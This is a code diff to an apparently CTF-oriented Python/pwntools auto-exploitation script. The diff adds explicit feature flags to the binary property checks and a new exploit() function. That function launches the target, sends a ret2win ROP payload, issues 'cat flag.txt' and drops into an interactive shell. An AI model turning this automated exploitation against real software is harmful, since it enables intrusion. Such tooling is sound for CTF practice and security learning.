@@ -4,7 +4,7 @@ import sys
 from fart import *
 import FMT
 import ROP
-
+import time
 
 logging.getLogger('pwnlib').setLevel(logging.WARNING)
 
@@ -13,51 +13,90 @@ def check_vuln_type(binary):
     if binary.has_binsh():
         print("[+]String of interest: 'binsh' present")
         properties["binsh"] = True
+    else:
+        properties["binsh"] = False
+
     if binary.has_flagtxt():
         print("[+] String of interest: 'flag.txt' present")
         properties["flag"] = True
+    else:
+        properties["flag"] = False
+
     if binary.has_catflagtxt():
         print("[+] String of interest: 'cat flag.txt' present")
         properties["cat"] = True
+    else:
+        properties["cat"] = False
+
     if binary.has_gets():
         print("[+] Gets present")
         properties["gets"] = True
+    else:
+        properties["gets"] = False
+
     if binary.has_win():
         print("[+] Win function present")
         properties["win"] = True
+    else:
+        properties["win"] = False
+
     if binary.has_system():
         print("[+] System function present")
         properties["system"] = True
+    else:
+        properties["system"] = False
+
     if binary.has_printf():
         print("[+] Printf function present")
         properties["printf"] = True
+    else:
+        properties["printf"] = False
+
     if binary.has_syscall():
         print("[+] Syscall function present")
         properties["syscall"] = True
+    else:
+        properties["syscall"] = False
+
     if binary.has_format():
         print("[+] Possible format string bug")
         properties["format"] = True
+    else:
+        properties["format"] = False
+
     if binary.has_execve():
         print("[+] Execve function present")
         properties["execve"] = True
+    else:
+        properties["execve"] = False
+
     if binary.has_rop():
         print("[+] Possible ROP conditions")
         properties["rop"] = True
+    else:
+        properties["rop"] = False
 
     return properties
 
+def exploit(binary, properties):
 
+    p = process(binary)
+    payload = None
+    
+    if properties["win"]:
+        rop = ROP.ROP(binary, properties)
+        payload = rop.ret2win()
+        
+
+    if payload:
+        p.sendline(payload)
+        if properties["binsh"]:
+            p.sendline(b"cat flag.txt")
+        p.interactive()
 
 if __name__ == "__main__":
     binary = args.BIN
 
     analyze = Analyze(binary)
-    properties = check_vuln_type(binary)
-
-    #TODO: Create a function that determines what to do given properties
-    if properties["win"]:
-        #TODO: Move this stuff to ROP
-        #wtf = Get2overflow(binary)
-        #offset = wtf.buf()
-        rop = ROP.ROP(binary, properties)
-        rop.ret2win()
+    properties = check_vuln_type(analyze)
+    exploit(binary, properties)
